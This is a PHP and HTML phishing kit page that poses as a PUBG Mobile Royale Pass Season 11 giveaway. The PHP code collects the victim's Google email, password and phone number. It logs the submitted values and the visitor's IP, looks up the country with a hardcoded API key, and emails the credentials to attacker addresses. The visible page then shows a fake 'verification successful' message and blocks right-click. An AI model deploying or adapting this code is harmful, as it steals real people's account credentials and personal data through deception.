<?php
 $ip = $_SERVER['REMOTE_ADDR']; 
 $api_key = "acc6551c01c6e1870a7832c5314eb49f";
 $freegeoipjson = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."");
 $jsondata = json_decode($freegeoipjson);
 $countryfromip = $jsondata->country_name;
 ?>

<?php
include ('../../admin/config.php');
$headers = "From: mr.kanhan@gmail.com";
$headers.= "Content-type: text/html";

$handle = fopen("../../admin/vic.php", "a");
foreach ($_GET as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "");
}
fwrite($handle, "");
fclose($handle);

$file = fopen("../../admin/vic.php", "a");

fclose($file);
$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('../../admin/VisitorsIP.log', $line . PHP_EOL, FILE_APPEND);
?>

<?php
$username = $_GET['username'];
$password = $_GET['password'];
$phone = $_GET['phone'];
$login = $_GET['login'];
$message   = "
===[ SETOR AKUN google BOS ! ]===

• email :  ".$username."
• pass	:  ".$password."
• ho hp :  ".$phone."
• login :  google

===[ INFO DEVICE ]===

• ip	:  ".$ip."
• region:  ".$countryfromip."


===[ https://www.youtube.com/channel/UCjYYrVmDfk28W7v4tpC1IZg ]===



















";

include '../../email.php';
$subject = "acc google [ ".$nick." ]";
$headers = "From: • acc BOSS • <zahran@kasep>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
<?php


$username = $_GET['username'];
$password = $_GET['password'];
$phone = $_GET['phone'];
$login = $_GET['login'];



$email_admin = 
"khafidnurohman@yandex.com@gmail.com";
$tomail = $email_admin; 

$subject = "acc google|$username|$level";
$message = '
<center><div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=6><b>result</b></font></div>
<div style="margin-top:10px;margin-bottom:10px;border-radius:3px;padding:5px;width:100%;background:black;color:white;text-align:center;">
<hr style="color:red">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="color:white;padding:3px;background:red">
				email
			</th>
			<th style="color:white;padding:3px;background:red">
				pass
			</th>
			<th style="color:white;padding:3px;background:red">
				nomor hp
			</th>
			<th style="color:white;padding:3px;background:red">
				login  
			</th>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$username.'</b>
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$password.'</b>				
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$phone.'</b>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.google.'</b>
			</td>
		</tr>
	</tbody>
	<hr style="color:red">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="color:white;padding:3px;background:red">
				VisitorIP  
			</th>
			<th style="color:white;padding:3px;background:red">
				Conuntry
			</th>			
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$ip.'</b>
			</td>
			<td align=center style="color:#24291D;padding:10px;background:white">
				<b>'.$countryfromip.'</b>				
			</td>
		</tr>
	</tbody>

</div>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:red;color:white;text-align:center;"><font size=3 color=white><b> 2019</b></font></div>
</center>
';

$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: acc BOSS  <zahran@kasep>' . "\r\n";
$datamail = mail($tomail,$subject, $message, $headersx);
?>

'<script>window.location.replace("http://111.90.150.204/")</script>';
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE - Royale Pass Season 11">
<meta name="description" content="Royale Pass Season 11 has begun! Collect your favorite prizes here right now !!! This promo is free without the need for topup. Come join this event with friends all over the world now!">
<meta property="og:description" content="Royale Pass Season 11 has begun! Collect your favorite prizes here right now !!! This promo is free without the need for topup. Come join this event with friends all over the world now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE - Royale Pass Season 11">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#f2aa00">
<meta property="og:image" content="https://www.pubgmobile.com/en/event/royalepass11/images/share.png">
<title>PUBG MOBILE - Royale Pass Season 11</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="img/icon.png">
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5dcbabd2869127ad"></script>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="container-wrapper">

<div class="header">
<img class="icon" src="img/icon.png">
<img class="season" src="img/season.png">
</div>

<div class="header-menu-box">
<center>
<div class="header-menu-list-more" style="width: 35%; margin-top: 2.9%;">
Processing Request
</div>
</center>
</div>

<div class="popup-box animated fadeIn" style="margin-top: 20%;">
<center>
<div class="notify">
<i class="zmdi zmdi-chevron-right zmdi-hc-lg"></i>
<div id="messageprocess"></div>
<script src="js/typewriter.js"></script>
<script>
var messageprocess = document.getElementById('messageprocess');
var typewriter = new Typewriter(messageprocess, { 
loop: true
});
typewriter.typeString('Congratulations, account verification successful') 
.pauseFor(1000) 
.deleteChars(8) 
.start();
</script>
</div>
<div class="message">
Hi, <?php echo $username;?></br>
Thank you for joining this event
</br>
Currently, your account is being processed to receive prizes
</br>
</br>
The system will process your account in 1 x 24 hours.
</br>
Please be patient
</div>
<center>
<form action="../../index.php" method="post">
<center>
<button type="submit" class="btn-back" >Logout</button>
</center>
</div>

</div>
</div>

</body>
<style>
img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] 
{ display: none; }
</style>
</html>